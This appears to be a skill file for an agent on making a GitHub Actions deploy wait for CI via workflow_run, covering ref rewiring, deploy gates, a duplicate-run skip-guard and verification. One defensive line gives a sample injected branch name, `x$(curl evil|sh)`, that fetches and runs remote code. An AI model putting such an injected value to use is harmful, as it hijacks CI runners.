---
name: github-actions-gate-deploy-on-ci-success
description: "When a deploy must wait for CI: workflow_run gate, ref rewiring, duplicate-run skip."
---

# Gate a deploy on CI success (`workflow_run`), including trigger widening and duplicate-run skip

Use when asked to make CD wait for CI / stop CD racing CI, to "also run CI on push for every branch", when
duplicate push+PR CI runs appear after widening a trigger, or when a `workflow_run` deploy targets the wrong
environment / never fires after merge / deploys a red commit.

`workflow_run` is never a one-line change. The event runs in a **different context** (default-branch ref, no
`workflow_run` object on dispatch), so a trigger-only edit silently misdeploys or stops deploying entirely.
Apply every step that applies, together, in one commit.

Related skills: `reviewing-ci-deploy-gate-prs` (verifying someone else's gate PR) and
`hardening-soft-ci-gate-with-red-baseline` (making the CI job the gate keys on actually fail).

## Step 0 — recon before writing anything

```bash
git fetch origin <base> --quiet
git show origin/<base>:.github/workflows/ci.yml | sed -n '4,10p'   # what triggers CI today?
git show origin/<base>:.github/workflows/cd.yml | sed -n '4,10p'
grep -n -A6 '^on:' .github/workflows/ci.yml .github/workflows/cd.yml
gh api repos/OWNER/REPO --jq '.default_branch'
gh pr list --repo OWNER/REPO --state all --limit 100 \
  --json headRefName,baseRefName -q '.[]|"\(.headRefName)->\(.baseRefName)"'
```

Three answers change the design:

- **Promotion PRs whose HEAD is a deploy branch** (`main`→`staging`)? Then branch-keyed concurrency and blanket
  skip-guards will cancel/skip a deploy-triggering CI run.
- **Is `pull_request` doing anything `push` does not?** (Does the PR show the check row?) If not, the PR trigger is
  redundant here.
- **Is branch protection available?** `gh api .../branches/main/protection` 403s on private free-plan repos → no
  required checks, so no required-check semantics to preserve.

**The coupling that silently kills all deploys:** the gate keys on `workflow_run.event == 'push'`. If CI has no
`push` trigger on the BASE branch, no push-triggered CI run will ever exist and CD never fires — worse than the
race being fixed. When CI lacks `push:`, the CI-trigger addition and the CD gate **must ship in the same PR**, and
the PR body must say so (otherwise a reviewer merges cd.yml alone and deploys go dark).

## Decision first: is `workflow_run` even the right tool?

| | Option A — `workflow_run` | Option B — merge deploy into ci.yml as a job |
|---|---|---|
| Shape | cd.yml triggers on CI completing | `deploy` job with `needs: build-and-test` + `if:` |
| Ref rewiring | **Required** (steps 3–4) | None — same run, ref context intact |
| Default-branch constraint | Yes | No |
| Skipped/cancelled CI | Silently skips deploy | Deploy job simply skipped with the run |

Option B is the default/lower-risk choice when ci.yml and cd.yml live in the same repo. Reach for A only when the
deploy must be separately permissioned or live in its own file/environment. Do not pick A by reflex.

**Option B trap:** job-level `concurrency:` does NOT protect an in-flight deploy. A workflow-level
`cancel-in-progress: true` cancels the whole run including the deploy job. Make it conditional
(`cancel-in-progress: ${{ github.event_name == 'pull_request' }}`) or key the group so only PR runs cancel.

## 1. Widen the CI trigger (only if CI must run on push)

```yaml
on:
  push:
    branches: [ "**" ]        # NOT bare `push:` — that also fires on tag pushes
  pull_request:
    branches: [main, staging, uat]
permissions:
  contents: read
  pull-requests: read          # gh pr list needs this; workflows pin least privilege
```

GitHub docs: defining neither `tags`/`tags-ignore` nor `branches`/`branches-ignore` means the workflow runs for
events affecting **either** branches or tags.

**Not retroactive.** GitHub resolves `.github/workflows/*.yml` at the pushed commit SHA — branches cut before the
change fire nothing until they inherit it. Land it on the default branch first; long-lived branches need it
cherry-picked or rebased.

## 2. Swap the CD trigger to `workflow_run`

```yaml
on:
  workflow_run:
    workflows: ["CI Pipeline"]      # matches ci.yml's `name:` FIELD, not the filename
    types: [completed]
    branches: [main, staging, uat]  # filters on the TRIGGERED run's branch
  workflow_dispatch:                # keep; carries no workflow_run object
```

**Delete `push:`** from cd.yml. Keeping both yields two deploys per push, one ungated.

## 3. Rewire every ref-context consumer (the trap that misdeploys)

`workflow_run` does **not** inherit the triggering run's ref — `GITHUB_REF`/`GITHUB_SHA` resolve to the **default
branch** / last commit on it. A `staging` push deploys `dev`.

| | `push` | `workflow_run` |
|---|---|---|
| `GITHUB_REF` | pushed branch | **default branch** |
| `GITHUB_SHA` | pushed commit | **last commit on default branch** |

Inventory the sites first — an environment name, resource group, container app, URL, image tag, or checkout ref
left on `github.ref_name` silently points at the wrong target:

```bash
grep -n 'ref_name\|github\.sha\|SOURCE_REF\|IMAGE_TAG' .github/workflows/cd.yml
```

| Was | Becomes |
|---|---|
| target/env derivation | `github.event.inputs.ref \|\| github.event.workflow_run.head_branch \|\| github.ref_name` |
| image tag | `github.event.workflow_run.head_sha \|\| github.sha` |
| checkout ref | `github.event.inputs.ref \|\| github.event.workflow_run.head_sha \|\| github.ref` |

The third term is **mandatory**, not defensive: `workflow_dispatch` carries no `workflow_run` object
(`head_branch` is null), and `inputs.ref` is commonly `required: false` — cleared it yields an empty string and a
malformed name like `ca-prod-ai-np--asset-api`. Payload shape: `head_branch` (string or null), `head_sha`
(string, required).

Replace **every** occurrence, not the first, and assert the count:

```python
n = s.count("github.event.workflow_run.head_branch")
s = s.replace("github.event.workflow_run.head_branch",
              "github.event.workflow_run.head_branch || github.ref_name")
print(n)  # sanity-check against the step-3 grep
```

Prefer a global token replace over enumerating whole expressions — hand-written expressions have varying
parentheses, so exact-string matches fail and the assertion count comes out wrong. Do **not** blanket-replace
`github.ref_name`; that destroys the dispatch fallback.

## 4. Gate the job on conclusion AND event

```yaml
jobs:
  deploy:
    if: ${{ github.event_name == 'workflow_dispatch' ||
           (github.event.workflow_run.event == 'push' &&
            github.event.workflow_run.conclusion == 'success') }}
```

Two independent reasons for each clause:

- `types: [completed]` fires "regardless of whether the workflow was successful or unsuccessful" — without the
  conclusion check, red **and** cancelled CI deploy (`cancelled` counts as not-success, which is correct: two fast
  pushes deploy only the last one).
- CI usually also runs on `pull_request`. `branches:` compares the *triggered* run's branch, so a green promotion
  PR (staging→main, head=`main`) matches and would deploy an **unmerged** commit. `event == 'push'` excludes it.

## 5. Duplicate push+PR runs: skip, don't cancel

Once a trigger is widened, a push to a branch with an open PR starts BOTH a `push` run and a
`pull_request` (synchronize) run. Concurrency does **not** dedupe them: the group
`${{ github.workflow }}-${{ github.ref }}` resolves to `refs/heads/<branch>` for push but
`refs/pull/<n>/merge` for the PR run — different lanes.

| Strategy | Result | Cost |
|---|---|---|
| Drop `pull_request`, keep only `push: ["**"]` | 1 run | Loses PR-specific semantics (none here if the PR shows the push check row) |
| Branch-keyed group `head_ref \|\| ref_name` + `cancel-in-progress` | 1 run | Loser shows as a RED `cancelled` check on the PR — and cancels the push run CD's gate needs |
| Skip-guard: probe job + `if:` on the heavy job | grey `skipped` | 2 job rows; rows come from RUNS, so 2 runs still make 2 rows |

Inline early-exit as a step is NOT equivalent to a skip — the job reports **success** having tested nothing.
Do not rewrite the concurrency key as part of a trigger-widening ask: two PRs from the same head branch to
different bases (main + staging) then collide and cancel each other.

Skip-guard shape:

```yaml
jobs:
  guard:
    runs-on: ubuntu-latest
    outputs:
      should_run: ${{ steps.decide.outputs.should_run }}
    steps:
      - id: decide
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          EVENT_NAME: ${{ github.event_name }}   # values via env, NEVER "${{ github.ref_name }}" in run:
          REF_NAME: ${{ github.ref_name }}
          REPO: ${{ github.repository }}
        run: |
          if [ "$EVENT_NAME" != "push" ]; then echo "should_run=true" >> "$GITHUB_OUTPUT"; exit 0; fi
          case "$REF_NAME" in main|staging|uat) echo "should_run=true" >> "$GITHUB_OUTPUT"; exit 0 ;; esac
          if ! open_prs=$(gh pr list --repo "$REPO" --head "$REF_NAME" --state open \
                --json baseRefName \
                --jq '[.[] | select(.baseRefName == "main" or .baseRefName == "staging" or .baseRefName == "uat")] | length'); then
            open_prs=""
          fi
          if [ "${open_prs:-}" != "" ] && [ "$open_prs" -gt 0 ]; then
            echo "should_run=false" >> "$GITHUB_OUTPUT"; echo "skip: $open_prs PR(s)"
          else
            echo "should_run=true" >> "$GITHUB_OUTPUT"; echo "run: count='${open_prs:-<lookup failed>}'"
          fi
  build-and-test:
    needs: guard
    if: needs.guard.outputs.should_run == 'true'
```

Details that are load-bearing:

- **Never skip deploy branches** (`main`/`staging`/`uat`): CD gates on this workflow's conclusion for them, so
  skipping kills the deploy. A skipped CI run still concludes `success`, so a `conclusion == 'success'` gate would
  deploy untested code.
- **Shell injection:** `${{ github.ref_name }}` substituted into `run:` is literal text before the shell parses it;
  a branch named `x$(curl evil|sh)` executes on the runner. Pass via `env:` and quote `"$REF_NAME"`. Same for
  `github.event_name`, `github.repository`.
- **`bash -e` defeats a naive fail-open:** `run:` steps default to `bash -e {0}`, so a failing `gh pr list` aborts
  the step before your `if`. Guard fails → `needs:`-gated job skipped → CI silently stops on that branch. Use
  `|| true` or wrap in `if !` (an `if` condition is exempt from errexit). Then test the empty count explicitly —
  fail open deliberately on 403/rate-limit/empty result; never add `set -euo pipefail` to the guard.
- **`gh pr list` does not OR repeated `--base` flags** (`--base main --base staging` matches nothing) — filter in
  `jq` or use a single `--base`.
- **`pull-requests: read`** must be in `permissions:` or the guard 403s.
- **The first push never skips.** The push run is created before the PR exists — inherent race, not a bug.
- Cost: two probe rows appear in addition to the build. One row is only possible by dropping a trigger.

## 6. Verify (runtime, not YAML reasoning)

```bash
actionlint -oneline .github/workflows/cd.yml .github/workflows/ci.yml
# install once when absent:
curl -sSL -o /tmp/actionlint.tar.gz \
  https://github.com/rhysd/actionlint/releases/download/v1.7.7/actionlint_1.7.7_darwin_arm64.tar.gz
cd /tmp && tar xzf actionlint.tar.gz actionlint && /tmp/actionlint -oneline repo/.github/workflows/*.yml
```

A YAML parse does NOT prove the `if:` was written — write the gate with a script that asserts an exact anchor line
and counts replacements, rather than a hand edit you then trust. Assert the parsed trigger too, since YAML turns
`on:` into the key `True`:

```python
d = yaml.safe_load(open('repo/.github/workflows/ci.yml'))
assert d.get(True, d.get('on'))['push']['branches'] == ['**']
```

Then simulate/observe all four entry paths — push/success must deploy; push/failure, pull_request/success, and
dispatch-with-empty-ref must not. Check the resolved environment, resource group, container app, image tag and
checkout ref for each:

```bash
gh run view <run-id> --repo <owner>/<repo> --json jobs -q '.jobs[] | "\(.name)=\(.conclusion // .status)"'
# push run  → guard=success  build-and-test=skipped
# PR run    → guard=success  build-and-test=success
gh run view <run-id> --repo <owner>/<repo> --log | grep 'guard' | grep -i 'skip:\|count'
# a working skip logs "skip: 1 open PR(s)"; count='' means the lookup failed and the skip never happened
gh run list --repo OWNER/REPO --branch BRANCH --limit 6 \
  --json databaseId,event,status,conclusion,headSha \
  -q '.[]|"\(.databaseId) \(.event) \(.status)/\(.conclusion) \(.headSha[0:7])"'
```

To force a push run while the PR is already open, push an empty commit. `pending` after `guard: success` means the
gate did not fire. Post-merge only: push one trivial commit to the default branch, confirm a CD run fires via
`workflow_run` and its image tag / checkout ref equal that commit's `head_sha`, not the branch tip.

## 7. Isolate the commit

Workflow changes touch files the target branch may also have in flight. Build off the base:

```bash
git worktree add /tmp/ciwork -b <branch> origin/<base>
cd /tmp/ciwork && git add .github/workflows/...   # stage exact paths, never `git add -A`
git diff --cached --numstat                       # confirm the file list / line counts
```

`git add -A` in a worktree showing unrelated modifications sweeps them into the commit. Check upstream tracking
first (`git rev-parse --abbrev-ref @{u}`): a local branch tracking `origin/main` plus a bare `git push` can push to
the default branch and fire the deploy pipeline. **If a stale branch carries a pre-fix copy of the workflow, land
the fix PR first** — otherwise the buggy version merges to the default branch and goes live.

## Reporting obligations

State all of these every time:

1. **Activation is not retroactive.** `workflow_run` triggers only if the file exists on the **default branch**, so
   the gate is inert on a feature branch and on branches cut before it merged. Never ship the workflow_run half
   without the ci.yml push half. Merging the trigger alone (before guard + ref rewiring) is *worse* than the
   `push:` trigger it replaced — it auto-deploys main's tip on every CI completion, red and cancelled included.
2. **The `workflows:` name coupling** matches ci.yml's `name:` field; renaming it silently disables CD. Confirm the
   name exists (`grep -m1 '^name:' ci.yml`).
3. **Whether "CI green" is a real gate.** Check for `continue-on-error: true` on test/lint steps — where present a
   failing test still reports success and the gate is decorative. Real examples: Tricipta `asset-api` marks Linter
   and Test-and-Coverage `continue-on-error: true`; `asset-web` marks Lint the same; `plot-api` genuinely gates.
   Check per repo in a PR family; do not generalize.
4. **Line endings.** If `cd.yml` shows a whole-file diff, check `.gitattributes`: when it declares
   `*.yml text eol=lf` but the committed blob is CRLF, any touch renormalizes the file. Content-equivalent — say so
   rather than letting a reviewer puzzle over 95/92. Verify with `git check-attr text eol -- <file>`, then
   `git diff --cached --numstat` (1/1 = only your lines; whole-file counts = renormalization, unavoidable).
5. **Rebase conflict side is inverted vs merge:** in a `rebase`, `<<<<<<< HEAD` is the already-rebased upstream
   side (the correct one) — `git checkout --ours` takes upstream.
